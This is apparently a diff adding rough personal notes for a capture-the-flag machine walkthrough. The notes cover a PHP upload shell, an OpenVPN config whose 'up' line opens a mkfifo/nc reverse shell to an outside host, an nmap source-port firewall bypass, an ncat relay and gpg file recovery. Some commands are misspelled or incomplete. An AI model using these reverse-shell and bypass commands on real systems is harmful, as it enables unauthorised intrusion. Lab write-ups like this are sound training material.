@@ -1,0 +1,51 @@
+we found a directory on main page which allowd php5 to be uloaded nad thus got a shell
+
+now it begins
+
+we got creds for dave and ssh
+
+we did ping on ==internal network== and got a hit .. and got port 80 open
+
+now it had a ==dns checkin==g input
+
+```
+remote 192.168.122.1
+ifconfig 10.200.0.2 10.200.0.1
+dev tun
+script-security 2
+up "/bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.122.1 8181 >/tmp/f'"
+nobind
+```
+
+we got root and user flag
+
+on desktop we got dave password nad we ssh it
+
+now on seeing we got new ip addr
+
+so we did ==nmap== and 2 ports were closed ..maybe firewall?
+
+so we used source port on it and found a new open port
+
+`nmap 192.168.5.2 -Pn -f --source-port=4444`
+
+```
+/usr/bin/ncat -l 1234 --sh-exec "ncat 192.168.5.2 987 -p 53" &
+ssh dave@localhost -p 1234
+same password
+```
+
+we found  root.txt.==gpg== file
+
+==gpg --list-keys== but no keys were found
+
+so did
+
+```
+base32 -w0 root.txt.gpg
+echo "" | bae32 -d > a.gpg
+in /dev/shm
+now we made a.gpg on every machine trying to open it 
+ gpg -d a.gpg 
+only on main machine we were able to open it and read the root file
+```
